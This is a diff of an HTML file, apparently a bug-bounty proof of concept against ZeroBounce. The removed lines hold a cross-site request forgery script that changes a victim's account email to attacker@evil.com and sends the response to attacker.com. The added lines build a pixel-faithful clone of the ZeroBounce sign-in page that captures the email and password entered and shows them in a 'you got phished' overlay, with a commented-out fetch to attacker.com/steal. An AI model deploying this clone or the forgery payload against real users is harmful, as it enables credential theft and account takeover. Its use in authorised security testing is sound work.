@@ -1,20 +1,669 @@
-<!-- Host this on attacker.com -->
-<html>
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Sign In - ZeroBounce</title>
+    <base href="/members/">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Sign in to your ZeroBounce account to access exclusive features and services. Securely sign in to manage your account and take advantage of our platform.">
+    <link rel="icon" type="image/x-icon" href="https://www.zerobounce.net/favicon.ico">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    <style>
+        @font-face {
+            font-family: Nunito Sans;
+            font-style: normal;
+            font-weight: 400;
+            font-display: swap;
+            src: url(https://fonts.gstatic.com/s/nunitosans/v6/pe0qMImSLYBIv1o4X1M8cce9I9s.woff2) format("woff2");
+        }
+        
+        @font-face {
+            font-family: Nunito Sans;
+            font-style: normal;
+            font-weight: 600;
+            font-display: swap;
+            src: url(https://fonts.gstatic.com/s/nunitosans/v6/pe03MImSLYBIv1o4X1M8cc9iB85tU1E.woff2) format("woff2");
+        }
+        
+        @font-face {
+            font-family: Nunito Sans;
+            font-style: normal;
+            font-weight: 700;
+            font-display: swap;
+            src: url(https://fonts.gstatic.com/s/nunitosans/v6/pe03MImSLYBIv1o4X1M8cc8GBs5tU1E.woff2) format("woff2");
+        }
+
+        :root {
+            --backgroundColor: #f8f9fd;
+            --baseTextColor: #6d7c91;
+            --highContrastColor: #171e25;
+            --middleContrastColor: #606e7b;
+            --lowerContrastColor: #e6ebf1;
+            --lowContrastColor: #fff;
+            --primary: #9255b7;
+            --primary-dark: #5f2781;
+            --primary-light: #f0e7fc;
+            --text-body: #606e7b;
+            --text-dark: #171e25;
+            --gray-border: #e6ebf1;
+            --background: #f8f9fd;
+            --background-light: #ffffff;
+            --error: #e65849;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+            min-width: 380px;
+        }
+
+        body {
+            font-family: 'Nunito Sans', sans-serif;
+            font-size: 14px;
+            color: var(--highContrastColor);
+            background-color: var(--backgroundColor);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .auth-container {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .auth-wrapper {
+            width: 100%;
+            max-width: 1200px;
+            display: flex;
+            background: var(--lowContrastColor);
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+        }
+
+        .auth-left {
+            flex: 1;
+            padding: 60px 50px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .auth-right {
+            flex: 1;
+            background: linear-gradient(135deg, #9255b7 0%, #5f2781 100%);
+            padding: 60px 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .auth-right::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            top: -50%;
+            left: -50%;
+        }
+
+        .auth-right img {
+            max-width: 100%;
+            height: auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo {
+            margin-bottom: 40px;
+        }
+
+        .logo svg {
+            width: 160px;
+            height: 45px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: var(--text-body);
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+
+        .subtitle a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .subtitle a:hover {
+            text-decoration: underline;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: var(--text-dark);
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid var(--gray-border);
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: 'Nunito Sans', sans-serif;
+            transition: all 0.2s;
+            background: var(--background-light);
+            color: var(--text-dark);
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: var(--background-light);
+        }
+
+        input::placeholder {
+            color: var(--baseTextColor);
+            opacity: 0.6;
+        }
+
+        .remember-forgot {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .checkbox-wrapper input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: var(--primary);
+        }
+
+        .checkbox-wrapper label {
+            margin: 0;
+            cursor: pointer;
+            color: var(--text-body);
+            font-weight: 400;
+        }
+
+        .forgot-link {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px 24px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Nunito Sans', sans-serif;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(146, 85, 183, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 28px 0;
+            color: var(--text-body);
+            font-size: 13px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--gray-border);
+        }
+
+        .divider span {
+            padding: 0 16px;
+        }
+
+        .social-buttons {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .btn-social {
+            flex: 1;
+            padding: 12px;
+            border: 2px solid var(--gray-border);
+            border-radius: 8px;
+            background: var(--background-light);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            font-family: 'Nunito Sans', sans-serif;
+            color: var(--text-dark);
+            transition: all 0.2s;
+        }
+
+        .btn-social:hover {
+            border-color: var(--primary);
+            background: var(--primary-light);
+        }
+
+        .btn-social svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .footer-links {
+            text-align: center;
+            color: var(--text-body);
+            font-size: 12px;
+            margin-top: 24px;
+            line-height: 1.6;
+        }
+
+        .footer-links a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Hacked Overlay Styles */
+        .hacked-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.98);
+            z-index: 99999;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s;
+        }
+
+        .hacked-overlay.show {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .hacked-content {
+            text-align: center;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            max-width: 600px;
+            padding: 40px;
+        }
+
+        .hacked-emoji {
+            font-size: 100px;
+            margin-bottom: 20px;
+            animation: bounce 1s infinite;
+        }
+
+        .hacked-title {
+            font-size: 48px;
+            color: #ff0000;
+            text-shadow: 
+                0 0 10px #ff0000,
+                0 0 20px #ff0000,
+                0 0 30px #ff0000;
+            margin-bottom: 30px;
+            animation: glitch 1s infinite;
+            font-weight: bold;
+        }
+
+        .credentials-box {
+            background: rgba(0, 255, 0, 0.05);
+            border: 3px solid #00ff00;
+            border-radius: 12px;
+            padding: 30px;
+            margin: 30px 0;
+            text-align: left;
+        }
+
+        .credentials-box h3 {
+            color: #ffff00;
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .cred-item {
+            margin: 15px 0;
+            font-size: 18px;
+            color: #00ff00;
+            word-break: break-all;
+        }
+
+        .cred-label {
+            color: #ffff00;
+            font-weight: bold;
+        }
+
+        .warning-section {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(255, 255, 0, 0.1);
+            border: 2px solid #ffff00;
+            border-radius: 8px;
+        }
+
+        .warning-title {
+            color: #ff0000;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .warning-text {
+            color: #ffff00;
+            font-size: 14px;
+            line-height: 1.8;
+            text-align: left;
+        }
+
+        .warning-text ul {
+            margin-top: 10px;
+            padding-left: 20px;
+        }
+
+        .warning-text li {
+            margin: 8px 0;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-30px); }
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 3px 3px #ff0000, -3px -3px #00ff00; }
+            25% { text-shadow: -3px 3px #ff0000, 3px -3px #00ff00; }
+            50% { text-shadow: 3px -3px #ff0000, -3px 3px #00ff00; }
+            75% { text-shadow: -3px -3px #ff0000, 3px 3px #00ff00; }
+            100% { text-shadow: 3px 3px #ff0000, -3px -3px #00ff00; }
+        }
+
+        @media (max-width: 992px) {
+            .auth-right {
+                display: none;
+            }
+            
+            .auth-left {
+                padding: 40px 30px;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .auth-left {
+                padding: 30px 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .social-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
 <body>
-<script>
-fetch('https://test/', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  credentials: 'include', // Include cookies
-  body: JSON.stringify({
-    new_email: 'attacker@evil.com',
-    confirmed_new_email: 'attacker@evil.com'
-  })
-})
-.then(r => r.text())
-.then(d => fetch('https://attacker.com/log?data=' + encodeURIComponent(d)));
-</script>
+    <div class="auth-container">
+        <div class="auth-wrapper">
+            <div class="auth-left">
+                <div class="logo">
+                    <svg viewBox="0 0 160 45" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <text x="0" y="30" font-family="Nunito Sans, sans-serif" font-size="28" font-weight="700" fill="#9255b7">ZeroBounce</text>
+                    </svg>
+                </div>
+
+                <h1>Sign in to your account</h1>
+                <p class="subtitle">
+                    Don't have an account? <a href="#">Sign up for free</a>
+                </p>
+
+                <form id="signinForm">
+                    <div class="form-group">
+                        <label for="email">Email address</label>
+                        <div class="input-wrapper">
+                            <input 
+                                type="email" 
+                                id="email" 
+                                name="email" 
+                                placeholder="Enter your email" 
+                                required 
+                                autocomplete="email"
+                            >
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <div class="input-wrapper">
+                            <input 
+                                type="password" 
+                                id="password" 
+                                name="password" 
+                                placeholder="Enter your password" 
+                                required
+                                autocomplete="current-password"
+                            >
+                        </div>
+                    </div>
+
+                    <div class="remember-forgot">
+                        <div class="checkbox-wrapper">
+                            <input type="checkbox" id="remember" name="remember">
+                            <label for="remember">Remember me</label>
+                        </div>
+                        <a href="#" class="forgot-link">Forgot password?</a>
+                    </div>
+
+                    <button type="submit" class="btn-primary">Sign in</button>
+
+                    <div class="divider">
+                        <span>or continue with</span>
+                    </div>
+
+                    <div class="social-buttons">
+                        <button type="button" class="btn-social" id="googleBtn">
+                            <svg viewBox="0 0 24 24" fill="none">
+                                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                            </svg>
+                            Google
+                        </button>
+                        <button type="button" class="btn-social" id="microsoftBtn">
+                            <svg viewBox="0 0 24 24" fill="none">
+                                <rect x="1" y="1" width="10" height="10" fill="#F25022"/>
+                                <rect x="13" y="1" width="10" height="10" fill="#7FBA00"/>
+                                <rect x="1" y="13" width="10" height="10" fill="#00A4EF"/>
+                                <rect x="13" y="13" width="10" height="10" fill="#FFB900"/>
+                            </svg>
+                            Microsoft
+                        </button>
+                    </div>
+
+                    <div class="footer-links">
+                        By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
+                    </div>
+                </form>
+            </div>
+
+            <div class="auth-right">
+                <img src="https://www.zerobounce.net/members/assets/auth/login-image-sm.png" alt="Email validation illustration" onerror="this.style.display='none'">
+            </div>
+        </div>
+    </div>
+
+    <!-- Hacked Overlay -->
+    <div class="hacked-overlay" id="hackedOverlay">
+        <div class="hacked-content">
+            <div class="hacked-emoji">🎣💀</div>
+            <div class="hacked-title">I GOT YOUR CREDS!</div>
+            
+            <div class="credentials-box">
+                <h3>🚨 CAPTURED CREDENTIALS 🚨</h3>
+                <div class="cred-item">
+                    <span class="cred-label">📧 Email:</span> <span id="capturedEmail"></span>
+                </div>
+                <div class="cred-item">
+                    <span class="cred-label">🔑 Password:</span> <span id="capturedPassword"></span>
+                </div>
+            </div>
+
+            <div class="warning-section">
+                <div class="warning-title">⚠️ THIS IS A SECURITY DEMONSTRATION ⚠️</div>
+                <div class="warning-text">
+                    <p><strong>YOU JUST GOT PHISHED!</strong></p>
+                    <p>This is a demonstration for bug bounty testing. Your credentials were NOT sent to any server.</p>
+                    
+                    <p><strong>How to protect yourself:</strong></p>
+                    <ul>
+                        <li>✓ Always verify the URL in the address bar</li>
+                        <li>✓ Look for HTTPS and valid SSL certificates</li>
+                        <li>✓ Enable Two-Factor Authentication (2FA)</li>
+                        <li>✓ Use a password manager</li>
+                        <li>✓ Never click suspicious links from emails</li>
+                        <li>✓ Be cautious of urgent security warnings</li>
+                    </ul>
+
+                    <p><strong>Red flags in this attack:</strong></p>
+                    <ul>
+                        <li>✗ URL is not zerobounce.net</li>
+                        <li>✗ Came from an open redirect vulnerability</li>
+                        <li>✗ Too easy to replicate login pages</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Form submission handler
+        document.getElementById('signinForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Display captured credentials
+            document.getElementById('capturedEmail').textContent = email;
+            document.getElementById('capturedPassword').textContent = password;
+            
+            // Show hacked overlay
+            document.getElementById('hackedOverlay').classList.add('show');
+            
+            // In a real attack, credentials would be sent to attacker's server:
+            // fetch('https://attacker.com/steal', {
+            //     method: 'POST',
+            //     headers: {'Content-Type': 'application/json'},
+            //     body: JSON.stringify({ email: email, password: password, timestamp: Date.now() })
+            // });
+            
+            console.log('🎣 PHISHING DEMO - Captured Credentials:');
+            console.log('Email:', email);
+            console.log('Password:', password);
+            console.log('Timestamp:', new Date().toISOString());
+        });
+
+        // Prevent default behavior on links
+        document.querySelectorAll('a').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+            });
+        });
+
+        // Prevent social login buttons
+        document.getElementById('googleBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('This is a phishing demonstration. Social login is disabled.');
+        });
+
+        document.getElementById('microsoftBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('This is a phishing demonstration. Social login is disabled.');
+        });
+
+        // Log page load for demonstration
+        console.log('%c🎣 PHISHING DEMONSTRATION PAGE 🎣', 'color: red; font-size: 20px; font-weight: bold;');
+        console.log('%cThis page mimics zerobounce.net for security research', 'color: yellow; font-size: 14px;');
+        console.log('%cCredentials entered here are NOT transmitted', 'color: green; font-size: 14px;');
+    </script>
 </body>
 </html>
